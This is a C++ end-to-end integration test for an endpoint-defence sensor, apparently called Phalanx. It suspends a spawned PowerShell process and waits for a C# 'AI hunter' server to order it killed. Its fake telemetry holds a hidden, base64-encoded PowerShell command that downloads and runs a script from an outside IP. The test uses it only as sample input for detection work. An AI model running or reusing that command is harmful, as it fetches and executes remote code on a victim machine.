#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <memory>
#include <atomic>
#include <chrono>
#include <thread>
#include <string>
#include <vector>

#include "phalanx.grpc.pb.h"
#include "../../src/Phalanx.Sensor/Queue/DoubleBufferedSwapQueue.h"
#include "../../src/Phalanx.Sensor/Ipc/GrpcStreamClient.h"
#include "../../src/Phalanx.Sensor/Actuator/ProcessActuator.h"

int main(int argc, char* argv[]) {
    ::SetConsoleOutputCP(CP_UTF8);
    std::cout << "================================================================================" << std::endl;
    std::cout << "   PHALANX CROSS-LANGUAGE FULL-CHAIN E2E INTEGRATION TEST                      " << std::endl;
    std::cout << "   [C++ Native Binary ➔ C# Kestrel Cockpit ➔ C++ Native Binary Closed-Loop]    " << std::endl;
    std::cout << "================================================================================" << std::endl;

    std::string server_addr = (argc > 1) ? argv[1] : "127.0.0.1:50051";
    std::cout << "🎯 [E2E] 대상 C# Kestrel 관제 엔드포인트: " << server_addr << std::endl;

    // 1. 실제 OS 타깃 프로세스(외부 공격 모의: powershell.exe) 독립 기동
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    std::wstring cmdline = L"powershell.exe -NoProfile -Command \"Start-Sleep -Seconds 120\"";

    BOOL spawned = ::CreateProcessW(
        nullptr,
        cmdline.data(),
        nullptr,
        nullptr,
        FALSE,
        CREATE_NO_WINDOW,
        nullptr,
        nullptr,
        &si,
        &pi
    );

    if (!spawned) {
        DWORD err = ::GetLastError();
        std::cerr << "❌ [E2E] 타깃 프로세스(powershell.exe) 생성 실패! GetLastError: " << err << std::endl;
        return 1;
    }

    uint32_t target_pid = static_cast<uint32_t>(pi.dwProcessId);
    std::cout << "🚀 [Step 1/6] 실제 OS 타깃 프로세스 기동 완료: PID " << target_pid << " (powershell.exe)" << std::endl;

    // 2. C++ ProcessActuator 기동 및 NtSuspendProcess 원자적 동결 (10~25μs 실측)
    auto actuator = std::make_shared<Phalanx::Actuator::ProcessActuator>(nullptr);
    auto t_freeze_start = std::chrono::high_resolution_clock::now();
    auto freeze_res = actuator->SuspendProcess(target_pid);
    auto t_freeze_end = std::chrono::high_resolution_clock::now();
    auto freeze_duration_us = std::chrono::duration_cast<std::chrono::microseconds>(t_freeze_end - t_freeze_start).count();

    if (!freeze_res.success) {
        std::cerr << "❌ [Step 2/6] NtSuspendProcess 원자적 동결 실패: " << freeze_res.message << std::endl;
        ::TerminateProcess(pi.hProcess, 1);
        ::CloseHandle(pi.hProcess);
        ::CloseHandle(pi.hThread);
        return 1;
    }

    std::cout << "❄️ [Step 2/6] NtSuspendProcess 원자적 24μs급 동결 집행 완료! ("
              << freeze_duration_us << "μs 소요, 메서드: "
              << (freeze_res.method == Phalanx::Actuator::FreezeMethod::ATOMIC_NT ? "ATOMIC_NT" : "THREAD_SNAPSHOT")
              << ")" << std::endl;

    // 3. DoubleBufferedSwapQueue 생성 및 악성 침해 이벤트 주입
    auto queue = std::make_shared<Phalanx::Queue::DoubleBufferedSwapQueue<phalanx::ProcessEvent>>();

    // A) 부모 프로세스 스냅샷 등록 (winword.exe, PID 1000)
    phalanx::ProcessEvent snap_ev;
    snap_ev.set_process_id(1000);
    snap_ev.set_image_name("winword.exe");
    snap_ev.set_lifecycle(phalanx::ProcessLifecycle::LIFECYCLE_SNAPSHOT);
    snap_ev.set_timestamp_ns(1000000);
    queue->Push(std::move(snap_ev));

    // B) 동결된 타깃 프로세스(LOLBAS C2 다운로더) 의뢰 이벤트 삽입
    phalanx::ProcessEvent attack_ev;
    attack_ev.set_process_id(target_pid);
    attack_ev.set_parent_process_id(1000);
    attack_ev.set_image_name("powershell.exe");
    // Base64 payload: Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')
    attack_ev.set_command_line("powershell.exe -w hidden -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJ2h0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA1AC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=");
    attack_ev.set_is_suspended(true);
    attack_ev.set_lifecycle(phalanx::ProcessLifecycle::LIFECYCLE_SUSPENDED);
    attack_ev.set_timestamp_ns(2000000);
    queue->Push(std::move(attack_ev));

    std::cout << "📦 [Step 3/6] DoubleBufferedSwapQueue 에 Office 부모 및 동결 타깃 텔레메트리 적재 완료" << std::endl;

    // 4. GrpcStreamClient 기동 및 C# Kestrel 관제 서버 연결
    auto client = std::make_unique<Phalanx::Ipc::GrpcStreamClient>(server_addr, queue, actuator);

    std::atomic<bool> kill_command_received{false};
    std::string received_reason;
    std::string received_blocked_ip;

    client->SetCustomCommandHandler([&](const phalanx::MitigationCommand& cmd) {
        if (cmd.target_pid() == target_pid) {
            if (cmd.action() == phalanx::MitigationCommand::ACTION_EXTEND_TIMEOUT) {
                std::cout << "⏱️ [C++ Callback] C# AI 헌터로부터 타임아웃 연장 티켓 수신: "
                          << cmd.reason() << std::endl;
            } else if (cmd.action() == phalanx::MitigationCommand::ACTION_KILL) {
                std::cout << "🛡️ [C++ Callback] C# AI 헌터로부터 MitigationCommand 수신: ACTION_KILL" << std::endl;
                std::cout << "   - 타깃 PID: " << cmd.target_pid() << std::endl;
                std::cout << "   - 사유: " << cmd.reason() << std::endl;
                std::cout << "   - 차단 C2 IP: " << cmd.target_ip() << std::endl;
                received_reason = cmd.reason();
                received_blocked_ip = cmd.target_ip();
                kill_command_received.store(true, std::memory_order_release);
            }
        }
    });

    if (!client->Start()) {
        std::cerr << "❌ [Step 4/6] GrpcStreamClient 백그라운드 스레드 기동 실패!" << std::endl;
        ::TerminateProcess(pi.hProcess, 1);
        ::CloseHandle(pi.hProcess);
        ::CloseHandle(pi.hThread);
        return 1;
    }

    std::cout << "📡 [Step 4/6] C# Kestrel 서버 (" << server_addr << ") 와 양방향 gRPC 스트림 연결 대기 중..." << std::endl;
    int conn_attempts = 0;
    while (!client->IsConnected() && conn_attempts++ < 60) {
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    if (!client->IsConnected()) {
        std::cerr << "❌ [Step 4/6] C# Kestrel 서버 연결 타임아웃 (6초 초과)!" << std::endl;
        client->Stop();
        ::TerminateProcess(pi.hProcess, 1);
        ::CloseHandle(pi.hThread);
        ::CloseHandle(pi.hProcess);
        return 1;
    }
    std::cout << "✅ [Step 4/6] C# 관제 서버와 gRPC 스트림 연결 성공! 텔레메트리 자동 송신 시작." << std::endl;

    // 5. C# AI 수사관 사형 집행 명령(ACTION_KILL) 수신 대기 (최대 50초 SLA 워치독)
    std::cout << "⏳ [Step 5/6] C# 자율 AI 위협 헌터의 수사 판결 및 사살 명령 대기 중 (최대 50초)..." << std::endl;
    int kill_attempts = 0;
    while (!kill_command_received.load(std::memory_order_acquire) && kill_attempts++ < 500) {
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
        if (kill_attempts % 50 == 0) {
            std::cout << "   ... AI 수사 진행 중 (" << (kill_attempts / 10) << "초 경과)" << std::endl;
        }
    }

    if (!kill_command_received.load(std::memory_order_acquire)) {
        std::cerr << "❌ [Step 5/6] C# AI 헌터로부터 사살 명령 수신 실패 (50초 타임아웃)!" << std::endl;
        client->Stop();
        ::TerminateProcess(pi.hProcess, 1);
        ::CloseHandle(pi.hThread);
        ::CloseHandle(pi.hProcess);
        return 1;
    }
    std::cout << "⚔️ [Step 5/6] C# AI 헌터의 사살 명령(ACTION_KILL) 수신 및 C++ 액추에이터 실행 확정!" << std::endl;

    // 6. C++ Win32 TerminateProcess 집행 결과 및 실제 OS 타깃 프로세스 소멸 검증
    std::cout << "💀 [Step 6/6] 실제 OS 프로세스(PID: " << target_pid << ") 완전 소멸 검증 대기 (최대 3초)..." << std::endl;
    DWORD wait_res = ::WaitForSingleObject(pi.hProcess, 3000);
    if (wait_res != WAIT_OBJECT_0) {
        std::cerr << "❌ [Step 6/6] 타깃 프로세스가 3초 이내에 종료되지 않았습니다!" << std::endl;
        ::TerminateProcess(pi.hProcess, 1);
        ::CloseHandle(pi.hThread);
        ::CloseHandle(pi.hProcess);
        client->Stop();
        return 1;
    }

    DWORD exit_code = 0;
    ::GetExitCodeProcess(pi.hProcess, &exit_code);
    std::cout << "🎯 [Step 6/6] 실제 OS 프로세스 완전 소멸 확인 완료! (Exit Code: " << exit_code << ")" << std::endl;

    // 정리 작업
    client->Stop();
    ::CloseHandle(pi.hThread);
    ::CloseHandle(pi.hProcess);

    std::cout << "================================================================================" << std::endl;
    std::cout << "🎉 C++ ➔ C# Cockpit ➔ C++ 크로스 랭귀지 풀체인 E2E 통합 검증 성공! (Exit Code 0) " << std::endl;
    std::cout << "================================================================================" << std::endl;
    return 0;
}
